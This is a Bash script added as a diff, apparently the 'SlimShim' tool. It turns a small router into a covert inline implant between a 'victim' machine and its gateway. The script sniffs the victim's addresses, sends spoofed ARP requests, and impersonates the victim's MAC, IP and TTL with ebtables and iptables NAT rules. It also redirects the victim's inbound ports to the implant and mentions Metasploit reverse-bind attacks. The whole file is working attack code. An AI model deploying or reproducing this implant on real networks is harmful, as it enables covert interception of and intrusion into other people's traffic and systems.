@@ -1,0 +1,688 @@
+#!/bin/bash
+# 20160717 Kirby
+
+################################################################################
+# LICENSE
+#
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+################################################################################
+
+
+
+################################################################################
+function do_guess() {
+    local sniff
+    local sip
+    local rip
+    local rmac
+    local smac
+    local led
+    local dev='eth1'
+    local dirarg
+	local netguess
+    local ttl
+    local vlan
+    local tcpdumpcmd
+    local scapy=0
+    local dumpargs="tcp and not ether src ${ARGS[mymac]} and not ether dst ${ARGS[mymac]} and not ether src ff:ff:ff:ff:ff:ff and not ether dst ff:ff:ff:ff:ff:ff and not port 68 and not port 67 and not port 137 and not port 139 and not ip6 and not host ${ARGS[myip]} and not net 224.0.0.0/4 and not net 169.254.0.0/16 and not host 0.0.0.0"
+
+	# OpenWRT's tcpdump uses -P for direction.  Other distros use -Q
+    tcpdump --help 2>&1 |grep -q '\-P' && dirarg='-P in'
+    tcpdump --help 2>&1 |grep -q '\-Q' && dirarg='-Q in'
+
+    # eth0.2 on the Nexx WT3020 is in the center of the device.  Plug that interface into the victim.
+    grep -q 'Nexx WT3020' /proc/cpuinfo && dev='eth0.2'
+
+    while :; do
+		# Determine the victim's IP/MAC by watching inbound packets on the interface.
+		# It is critical that eth1 be plugged directly into the victim.
+        tcpdumpcmd="tcpdump -v -c1 -e -nni $dev $dirarg $dumpargs"
+        echo "############################################"
+        echo "# running $tcpdumpcmd"
+        echo "############################################"
+        sniff=$($tcpdumpcmd 2>/dev/null)
+        echo "############################################"
+        echo "# PACKET: $sniff"
+        echo "############################################"
+        sip=$(echo $sniff |sed -e 's/.* \([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\)\.[0-9]* > .*/\1/')
+        smac=$(echo $sniff |awk '{print $2}')
+        ttl=$(echo $sniff |sed -e 's/.* ttl \([0-9]*\), .*/\1/')
+        if ! echo $sip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"; then
+            echo "# BAD SIP $sip"
+            echo "# Gonna loop again"
+            continue
+        fi
+        if ! echo $smac |egrep -q "^[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+$"; then 
+            echo "# BAD SMAC $smac"
+            echo "# Gonna loop again"
+            continue
+        fi
+        if ! echo $ttl |egrep -q "^[0-9]+$"; then 
+            echo "# BAD TTL $ttl"
+            echo "# Gonna loop again"
+            continue
+        fi
+
+        if [ $ttl -lt 64 ]; then
+            echo "# WARNING: ttl $ttl is probably not right.  This may be a bad sniff.  Setting to 64"
+            ttl=64
+        fi
+        if echo $sniff |grep -q ' vlan '; then
+            vlan=$(echo $sniff |sed -e 's/.* vlan \([0-9]*\), .*/\1/')
+            if ! echo $vlan |egrep -q "^[0-9]+$"; then 
+                echo "# WTF.  Bad vlan $vlan.  Gonna ignore and not set the vlan."
+                vlan=''
+            fi
+        else
+            vlan=''
+        fi
+
+        echo "sip=$sip"
+        echo "smac=$smac"
+        echo "ttl=$ttl"
+        echo "vlan=$vlan"
+
+        # Now sniff for inbound with a non-default ttl to get router mac.  Anything that hopped has decremented ttl.
+		# Also assume that network is /24 and ignore local traffic as an extra precaution.
+		netguess="${sip%.*}.0"
+        echo "netguess=$netguess/24"
+        tcpdumpcmd="tcpdump -c1 -v -e -nni br-lan dst host $sip and not src net $netguess/24 and ip[8] != 64 and ip[8] != 128 and $dumpargs"
+        echo "############################################"
+        echo "# running $tcpdumpcmd"
+        echo "############################################"
+        sniff=$($tcpdumpcmd 2>/dev/null)
+        echo "############################################"
+        echo "# PACKET: $sniff"
+        echo "############################################"
+        rmac=$(echo $sniff |awk '{print $2}')
+        echo "rmac=$rmac"
+
+        if [ "$smac" == "$rmac" ]; then
+            echo "############################################"
+            echo "# BAD DATA"
+            echo "# $sniff"
+            echo "############################################"
+        else
+            break
+        fi
+    done
+
+
+    echo "# Getting routerip."
+    echo "# Wait until victim arp queries the router mac"
+    echo "#      OR unplug and replug ethernet (to victim) to run quicker"
+    while :; do
+        led='/sys/class/leds/nexx:blue:power/brightness'
+        if [ -f $led ]; then
+            touch /tmp/blink
+            blinkled $led & 
+        fi
+        
+        # On some devices you can run ip link dev down/up to simulate the unplug, but it will break on OpenWRT/LEDE
+        grep -q Kali /etc/os-release 2>/dev/null
+        if [ $? == 0 ]; then
+            echo "#"
+            echo "# Turning off/on interfaces to speed this up"
+            echo "# This will only work on hosts using dhcp"
+            echo "# Disable this in the script if your device becomes unresponsive"
+            ip link set dev eth1 down
+            sleep 1
+            ip link set dev eth1 up
+        fi
+
+        # Send arp request via scapy if we have it.
+        # Background it so we can catch it on the next tcpdump
+        # YOU MAY WANT TO DISABLE THIS.  This may cause the victim to alert to an IP collision.  Up to you.
+        if which scapy >/dev/null 2>&1; then
+            scapy=1
+            echo "# Sending arp via scapy to the assumed network $netguess/24"
+            if [ x$vlan != 'x' ]; then
+                ( sleep 3;  echo "srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/Dot1Q(vlan=$vlan)/ARP(pdst='$netguess/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')" |scapy >/dev/null 2>&1 ) &
+            else
+                ( sleep 3;  echo "srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/ARP(pdst='$netguess/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')" |scapy >/dev/null 2>&1 ) &
+            fi
+        fi
+
+        # 21:33:32.482541 ARP, Reply 192.168.1.1 is-at 68:05:ca:32:5e:85, length 46
+        #sniff=$(tcpdump -c1 -nni br-lan ether src $rmac and ether dst $smac and arp 2>/dev/null)
+        echo "#"
+        echo "# You may want to spoof arp requests with scapy"
+        echo "# Run this in another terminal:"
+        echo "# echo \"srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/ARP(pdst='GUESSTHENETWORK/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')\" |scapy"
+        echo "#"
+        sniff=$(tcpdump -c1 -nni br-lan ether src $rmac and arp 2>/dev/null)
+        rip=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
+        if [ "$rip" == "$sip" ]; then
+            echo "############################################"
+            echo "# BAD DATA"
+            echo "# $sniff"
+            echo "############################################"
+        elif echo $rip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"; then
+            echo "#"
+            echo "# PACKET: $sniff"
+            echo "#"
+            if [ $scapy == 1 ]; then
+                kill %1 >/dev/null 2>&1
+            fi
+            break
+        fi
+        echo "# Something went wrong.  Gonna loop"
+    done
+    if [ $scapy == 1 ]; then
+        kill %1 >/dev/null 2>&1
+    fi
+    if [ -f $led ]; then
+        rm /tmp/blink
+        echo 0 > $led
+    fi
+    echo "rip=$rip"
+
+    ARGS[rip]=$rip
+    ARGS[rmac]=$rmac
+    ARGS[sip]=$sip
+    ARGS[smac]=$smac
+    ARGS[ttl]=$ttl
+    ARGS[vlan]=$vlan
+}
+################################################################################
+function blinkled() {
+    local ledfile=$1
+    while [ -f /tmp/blink ]; do
+        echo 1 > $ledfile
+        sleep 1
+        echo 0 > $ledfile
+        sleep 2
+    done
+}
+################################################################################
+function do_getdns() {
+    echo 'nameserver 8.8.8.8' > /etc/resolv.conf
+    /etc/init.d/dnsmasq stop >/dev/null 2>&1
+    sniff=$(tcpdump -c1 -nni br-lan "not ip6 and udp and port 53" 2>/dev/null)
+    # 04:40:30.876500 IP 192.168.1.19.59369 > 192.168.1.1.53: 13937+ A? cnn.com. (25)
+    dns=$(echo $sniff |awk '{print $5}' |cut -d'.' -f1-4)
+    grep -q $dns /etc/resolv.conf
+    if [ $? != 0 ]; then
+        echo "nameserver $dns" > /etc/resolv.conf
+    fi
+    grep -q 8.8.8.8 /etc/resolv.conf
+    if [ $? != 0 ]; then
+        echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+    fi
+}
+################################################################################
+function do_arpwatch()
+{
+    local ip
+    local mac
+    local vlan
+    local sniff
+    local brdev
+
+    while :; do
+        if brctl show |grep -q br-lan; then
+            sniff=$(tcpdump -v -e -c1 -nni br-lan arp 2>/dev/null)
+            ip=''
+            mac=''
+            if echo $sniff |grep -q ' vlan '; then
+                vlan=$(echo $sniff |sed -e 's/.* vlan \([0-9]*\), .*/\1/')
+                brdev="br-lan.$vlan"
+            else
+                vlan=''
+                brdev='br-lan'
+            fi
+            if echo $sniff |grep -q is-at; then
+                mac=$(echo $sniff |sed 's/.* is-at \(.*\), .*/\1/')
+                ip=$(echo $sniff |sed 's/.* Reply \(.*\) is-at .*/\1/')
+            fi
+            if echo $sniff |grep -q who-has; then
+                mac=$(echo $sniff |awk '{print $2}')
+                ip=$(echo $sniff |sed -e 's/.* tell \(.*\), .*/\1/')
+            fi
+            if [ x$ip != 'x' ] && [ x$mac != 'x' ] && [ $ip != '0.0.0.0' ] && [ $mac != 'ff:ff:ff:ff:ff:ff' ]; then
+                if ip neigh |egrep  "^$ip " |grep -q $mac; then
+                    true
+                else
+                    echo $sniff
+                    echo "adding arp for $ip and $mac"
+                    ip neigh replace $ip lladdr $mac dev $brdev >/dev/null 2>&1
+                    route add $ip dev $brdev >/dev/null 2>&1
+                    echo ""
+                fi
+            fi
+        else
+            sleep 1
+        fi
+    done
+}
+################################################################################
+function redirectEgressIP()
+{
+# redirect outbound traffic from victim($sip) to destination($dip)
+    if [ x${ARGS[newdip]} == 'x' ]; then
+        ARGS[newdip]=${ARGS[myip]}
+    fi
+    if [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[origdip]} == 'x' ] || [ x${ARGS[newdip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+        echo "FAILURE: invalid args"
+        exit 1
+    fi
+    set -x
+    iptables -t nat -A PREROUTING -s ${ARGS[sip]} -d ${ARGS[origdip]} -p tcp -j DNAT --to-destination ${ARGS[newdip]}
+    set +x
+}
+################################################################################
+function redirectEgressPort()
+{
+# redirect outbound traffic from victim($sip) to destination($dip) for port $dstport
+    if [ x${ARGS[dstport]} == 'x' ] || [ x${ARGS[proto]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[origdip]} == 'x' ] || [ x${ARGS[newdip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+        echo "FAILURE: invalid args"
+        exit 1
+    fi
+    set -x
+    iptables -t nat -A PREROUTING -s ${ARGS[sip]} -d ${ARGS[origdip]} -p ${ARGS[proto]} -m ${ARGS[proto]} --dport ${ARGS[dstport]} -j DNAT --to-destination ${ARGS[newdip]}:${ARGS[dstport]}
+    set +x
+}
+################################################################################
+function redirectIngressPort() {
+# redirect traffic going to victim IP($sip) on $rdrport to the SlimShim on $dstport
+    if [ x${ARGS[proto]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[rdrport]} == 'x' ] || [ x${ARGS[dstport]} == 'x' ] || [ x${ARGS[myip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+        echo "FAILURE: invalid args"
+        exit 1
+    fi
+    set -x
+    iptables -t nat -A PREROUTING ! -s ${ARGS[myip]} -d ${ARGS[sip]} -p ${ARGS[proto]} -m ${ARGS[proto]} --dport ${ARGS[rdrport]} -j DNAT --to-destination ${ARGS[myip]}:${ARGS[dstport]}
+    set +x
+}
+################################################################################
+function redirectIngressPorts() {
+# redirct multiple ports(begin:end) to SlimShim.  Useful for reverse-bind attacks in Metasploit
+    if [ x${ARGS[proto]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[rdrport]} == 'x' ] || [ x${ARGS[dstport]} == 'x' ] || [ x${ARGS[myip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+        echo "FAILURE: invalid args"
+        exit 1
+    fi
+    set -x
+    iptables -t nat -A PREROUTING ! -s $myip -d $sip -p $proto -m $proto -m multiport --dports $rdrports -j DNAT --to-destination $myip
+    set +x
+}
+################################################################################
+function addLan() {
+# add a lan to the shim, e.g. wifi or openvpn on the SlimShim device
+    if [ x${ARGS[lan]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[rip]} == 'x' ] || [ x${ARGS[dynports]} == 'x' ]; then
+        echo "FAILURE: invalid args"
+        exit 1
+    fi
+    set -x
+    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[lan]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[lan]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[lan]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}
+    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[lan]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[lan]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[lan]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}
+    set +x
+}
+################################################################################
+function do_usage()
+{
+    cat <<EOF
+To shim a box:
+$0 shim --smac=<victim mac> --sip=<victim ip> --rmac=<router mac> --rip=<routerip>
+
+To prepare SlimShim with a bridge (automatically done when shim is run)
+$0 prep
+
+Guess the IP/MAC of victim and router
+$0 guess
+
+Guess the IP/MAC of victim and router and then run the shim
+$0 autoshim
+
+Watch for arps and populate arp table.  
+This is absolutely required after the shim is run, otherwise your SlimShim will not be able to connect to anything.
+I recommend you run this in screen: screen -dmS arpwatch $0 arpwatch
+$0 arpwatch
+
+EOF
+    exit 1
+}
+################################################################################
+function do_envwrite()
+{
+    # Write variables to env file
+    local envfile="/root/slimshim.env"
+    rm -f $envfile 2>/dev/null
+    for i in "${!ARGS[@]}"; do
+        echo "$i=${ARGS[$i]}" >>$envfile
+        echo "ARGS[$i]=${ARGS[$i]}" >>$envfile
+    done
+}
+################################################################################
+function do_clearall() {
+    ebtables -t filter -F >/dev/null 2>&1
+    iptables -t filter -F >/dev/null 2>&1
+    ebtables -t nat -F >/dev/null 2>&1
+    iptables -t nat -F >/dev/null 2>&1
+    iptables -t mangle -F >/dev/null 2>&1
+    iptables -t raw -F >/dev/null 2>&1
+}
+################################################################################
+function do_runprep() {
+    local gotofail=0
+    local int1
+    local int2
+
+    do_clearall
+    which ip iptables ebtables modprobe brctl route ifconfig sysctl >/dev/null 2>&1 
+    if [ $? != 0 ]; then
+        echo "FATAL ERROR: you are missing one or more commands"
+        echo "Make sure the following commands are in your path:"
+        echo "ip iptables ebtables modprobe brctl route ifconfig sysctl"
+        exit 1
+    fi
+    modprobe arptable_filter >/dev/null 2>&1
+    modprobe br_netfilter >/dev/null 2>&1
+
+    sysctl -w net.bridge.bridge-nf-call-arptables=1 >/dev/null 2>&1 || gotofail=1
+    sysctl -w net.bridge.bridge-nf-call-ip6tables=1 >/dev/null 2>&1 || gotofail=1
+    sysctl -w net.bridge.bridge-nf-call-iptables=1 >/dev/null 2>&1 || gotofail=1
+
+    # ADJUST FOR THE INTERFACES YOU HAVE
+    # NEXX devices only have eth0.1 and eth0.2
+    # WARNING: OpenWRT/LEDE devices will fail if you haven't configured the interfaces to tag with the cpu interface
+    grep -q 'Nexx WT3020' /proc/cpuinfo
+    if [ $? == 0 ]; then
+        int1=eth0.1
+        int2=eth0.2
+    else
+        int1=eth0
+        int2=eth1
+    fi
+    ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d ff:ff:ff:ff:ff:ff -j DROP >/dev/null 2>&1
+    ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d 01:00:5e:00:00:01 -j DROP >/dev/null 2>&1
+    ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d 33:33:00:00:00:01 -j DROP >/dev/null 2>&1
+
+    ifconfig $int1 -arp up
+    ifconfig $int2 -arp up
+    brctl show br-lan 2>&1 |grep -q "No such device" 
+    if [ $? == 0 ]; then
+        brctl addbr br-lan
+        brctl addif br-lan $int1
+        brctl addif br-lan $int2
+    fi
+    ifconfig br-lan ${ARGS[myip]} netmask 255.255.255.0 -arp up || gotofail=1
+    ip link set dev br-lan address ${ARGS[mymac]} arp off || gotofail=1
+    #route add default dev br-lan >/dev/null 2>&1
+
+    while ip route |grep -q default; do
+        defaultroute=$(ip route |grep default |head)
+        ip route delete $defaultroute >/dev/null 2>&1
+    done
+
+    if [ $gotofail == 1 ]; then
+        echo "FATAL ERROR: do_runprep function failed"
+        exit 1
+    fi
+}
+################################################################################
+function do_autoshim()
+{
+    do_runprep
+    do_guess
+    do_shim
+}
+################################################################################
+function do_shim()
+{
+    local brdev
+    local gotofail=0
+
+    # just to make sure we're ready
+    do_runprep
+    
+    if [ x${ARGS[vlan]} != 'x' ]; then
+        modprobe 8021q >/dev/null 2>&1
+        if lsmod |grep -q 8021q; then
+            true
+        else
+            echo "FAILURE: you need to install 8021q kernel module"
+            exit 1
+        fi
+        brdev="br-lan.${ARGS[vlan]}"
+        #vconfig add br-lan ${ARGS[vlan]}
+        ip link add link br-lan name $brdev type vlan id ${ARGS[vlan]}
+        ip link set dev $brdev up || gotofail=1
+        ifconfig br-lan 169.254.99.99/32 -arp up || gotofail=1
+        ifconfig $brdev ${ARGS[myip]} netmask 255.255.255.0 -arp up || gotofail=1
+    else
+        brdev="br-lan"
+    fi
+    ARGS[brdev]=$brdev
+
+    if [ $gotofail == '1' ]; then
+        echo "FATAL ERROR: do_shim function failed"
+        exit 1
+    fi
+
+    set -x
+    # slimshim going out
+    ebtables -t nat -A POSTROUTING -s ${ARGS[mymac]} ! -d ${ARGS[smac]} -j snat --to-source ${ARGS[smac]}
+    if [ x${ARGS[vlan]} != 'x' ]; then
+        ebtables -t nat -A POSTROUTING -p 0x8100 -s ${ARGS[mymac]} ! -d ${ARGS[smac]} -j snat --to-source ${ARGS[smac]}
+    fi
+    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[myip]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[myip]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[myip]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}
+    
+    # slimshim going to victim
+    ebtables -t nat -A POSTROUTING -s ${ARGS[mymac]} -d ${ARGS[smac]} -j snat --to-source ${ARGS[rmac]}
+    if [ x${ARGS[vlan]} != 'x' ]; then
+        ebtables -t nat -A POSTROUTING -p 0x8100 -s ${ARGS[mymac]} -d ${ARGS[smac]} -j snat --to-source ${ARGS[rmac]}
+    fi
+    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
+    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}
+    
+    # outside to victim
+    if [ x${ARGS[vlan]} == 'x' ]; then
+        # EXPERIMENTAL
+        #ebtables -t nat -A PREROUTING -p 0x0800 --ip-proto tcp --ip-destination ${ARGS[sip]} --ip-destination-port=${ARGS[rdrports]} -j dnat --to-destination ${ARGS[mymac]}
+        #ebtables -t nat -A PREROUTING -p 0x0800 --ip-proto udp --ip-destination ${ARGS[sip]} --ip-destination-port=${ARGS[rdrports]} -j dnat --to-destination ${ARGS[mymac]}
+        true
+    else
+        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[smac]} -d ${ARGS[rmac]} -j dnat --to-destination ${ARGS[mymac]}
+        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[rmac]} -d ${ARGS[smac]} -j dnat --to-destination ${ARGS[mymac]}
+    fi
+
+    iptables -t nat -A PREROUTING ! -s ${ARGS[myip]} -d ${ARGS[sip]} -p tcp -m tcp -m multiport --dports ${ARGS[rdrports]} -j DNAT --to-destination ${ARGS[myip]}
+    iptables -t nat -A PREROUTING ! -s ${ARGS[myip]} -d ${ARGS[sip]} -p udp -m udp -m multiport --dports ${ARGS[rdrports]} -j DNAT --to-destination ${ARGS[myip]}
+    
+    # victim going to slimshim
+    ip neigh replace ${ARGS[sip]} lladdr ${ARGS[smac]} dev $brdev >/dev/null 2>&1
+    ip neigh replace ${ARGS[rip]} lladdr ${ARGS[rmac]} dev $brdev >/dev/null 2>&1
+    
+    # mimic the ttl
+    iptables -t mangle -A POSTROUTING -o $brdev -j TTL --ttl-set ${ARGS[ttl]}
+
+    ip route add ${ARGS[sip]} dev $brdev >/dev/null 2>&1
+    ip route add ${ARGS[rip]} dev $brdev >/dev/null 2>&1
+    ip route add default via ${ARGS[rip]} dev $brdev >/dev/null 2>&1
+    set +x
+
+    do_envwrite
+}
+################################################################################
+
+
+################################################################################
+################################################################################
+# MAIN
+################################################################################
+################################################################################
+
+if ! id |grep -q uid=0; then
+    echo "You must be root to run this"
+    exit 1
+fi
+
+which tcpdump awk sed cut grep >/dev/null 2>&1
+if [ $? != 0 ]; then
+    echo "# FAIL: you must install the following: tcpdump awk sed cut"
+    exit 1
+fi
+
+case $1 in
+    shim)
+        COMMAND=do_shim
+        shift
+        ;;
+    prep)
+        COMMAND=do_runprep
+        shift
+        ;;
+    guess)
+        COMMAND=do_guess
+        shift
+        ;;
+    autoshim)
+        COMMAND=do_autoshim
+        shift
+        ;;
+    arpwatch)
+        COMMAND=do_arpwatch
+        shift
+        ;;
+    getdns)
+        COMMAND=do_getdns
+        shift
+        ;;
+    undo)
+        COMMAND=do_clearall
+        shift
+        ;;
+    redirectEgressIP)
+        COMMAND=redirectEgressIP
+        shift
+        ;;
+    redirectEgressPort)
+        COMMAND=redirectEgressPort
+        shift
+        ;;
+    redirectIngressPort)
+        COMMAND=redirectIngressPort
+        shift
+        ;;
+    redirectIngressPorts)
+        COMMAND=redirectIngressPorts
+        shift
+        ;;
+    addLan)
+        COMMAND=addLan
+        shift
+        ;;
+    *)
+        do_usage
+        shift
+        ;;
+esac
+
+declare -A ARGS
+for i in "$@"; do
+    case $i in
+        --smac=*)
+            ARGS[smac]="${i#*=}"
+            shift
+            ;;
+        --sip=*)
+            ARGS[sip]="${i#*=}"
+            shift
+            ;;
+        --rmac=*)
+            ARGS[rmac]="${i#*=}"
+            shift
+            ;;
+        --rip=*)
+            ARGS[rip]="${i#*=}"
+            shift
+            ;;
+        --proto=*)
+            ARGS[proto]="${i#*=}"
+            shift
+            ;;
+        --rdrport=*)
+            ARGS[rdrport]="${i#*=}"
+            shift
+            ;;
+        --dstport=*)
+            ARGS[dstport]="${i#*=}"
+            shift
+            ;;
+        --origdip=*)
+            ARGS[origdip]="${i#*=}"
+            shift
+            ;;
+        --newdip=*)
+            ARGS[newdip]="${i#*=}"
+            shift
+            ;;
+        --lan=*)
+            ARGS[lan]="${i#*=}"
+            shift
+            ;;
+        --help|-h|--usage)
+            do_usage
+            shift
+            ;;
+        --envfile=*)
+            envfile="${i#*=}"
+            if [ -f "$envfile" ]; then
+                . "$envfile"
+            else
+                echo "No env file $envfile"
+            fi
+            shift
+            ;;
+        *)
+            echo "#########################"
+            echo "# I don't know what $i is"
+            echo "#########################"
+            do_usage
+            exit 1
+            ;;
+    esac
+done
+
+ARGS[myip]='169.254.0.1'
+ARGS[mymac]='0:1:1:1:1:1'
+
+# rdrports must overlap with dynports.  Dynports are for source ports on egress connections.  Rdrports will be redirected to $myip.
+ARGS[dynports]='27000-32000'
+ARGS[rdrports]='27000:32000'
+# $dynports needs '-' and $rdrports needs ':'.   Blame it on netfilter.
+
+if [ $COMMAND == 'do_shim' ]; then
+    if [ x$sip == 'x' ] || [ x$smac == 'x' ] || [ x$rip == 'x' ] || [ x$rmac == 'x' ]; then
+        echo "FAILURE: missing arguments"
+        exit 1
+    fi
+fi
+
+# execute function set in $1
+$COMMAND
+
+echo "# ARGS:"
+for i in "${!ARGS[@]}"; do
+    echo "$i=${ARGS[$i]}"
+done
+
+
+
